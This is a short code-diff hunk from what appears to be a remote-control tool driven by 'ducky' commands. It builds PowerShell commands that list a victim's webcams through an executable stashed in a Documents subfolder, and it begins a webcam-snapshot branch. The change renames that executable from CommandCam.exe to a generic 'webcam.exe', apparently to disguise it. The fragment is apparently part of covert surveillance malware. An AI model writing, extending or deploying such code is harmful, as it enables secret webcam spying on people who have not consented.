@@ -318,7 +318,7 @@ while not stop:
             stdin = "; ".join(commands)
         elif ducky_command[:11] == "webcam_list":
             commands = []
-            commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /devlist")
+            commands.append("& \"$env:userprofile/Documents/z/webcam.exe\" /devlist")
             stdin = "; ".join(commands)
         elif ducky_command[:11] == "webcam_snap":
             options = [x for x in ducky_command.split(" ")[1:] if x]
